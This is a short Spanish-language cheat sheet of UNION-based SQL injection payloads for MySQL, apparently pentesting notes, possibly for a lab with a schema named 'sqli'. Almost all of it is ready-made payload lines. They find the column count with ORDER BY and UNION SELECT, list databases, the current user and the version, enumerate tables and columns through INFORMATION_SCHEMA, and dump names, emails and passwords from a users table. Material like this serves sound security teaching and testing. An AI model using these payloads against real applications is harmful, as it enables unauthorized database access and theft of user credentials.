# Enumerando una base de datos

Para enumerar la base de datos usaremos la sentencia `UNION`. Una sentencia `UNION` sólo puede operar sobre sentencias `SELECT` con igual número de columnas.

## Número de columnas con `ORDER BY`

El número más grande antes de que falle la consulta es el número de columnas

```sql
ORDER BY 1
ORDER BY 2
ORDER BY 3
ORDER BY 4
```
## Número de columnas con `UNION`
Hay que probar llenando la consulta con números (1,2,3,4) o strings ("junk") hasta que no de error

```sql
UNION SELECT 1
UNION SELECT 1,2
UNION SELECT 1,2,3
UNION SELECT 1,2,3,4
UNION SELECT "junk"
UNION SELECT "junk","junk"
UNION SELECT "junk","junk","junk"
UNION SELECT "junk","junk","junk","junk"
```
## Listar bases de datos, base de datos en uso, usuario y versión

```sql
UNION SELECT schema_name,database(),user(),@@version FROM INFORMATION_SCHEMA.SCHEMATA
```

## Listar tablas de la base de datos

```sql
UNION SELECT TABLE_NAME,2,3,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='sqli'
```

## Listar columnas de una tabla

```sql
UNION SELECT COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'
```

## Obtener filas de una tabla
```sql
UNION SELECT name,email,password,4 FROM sqli.users
```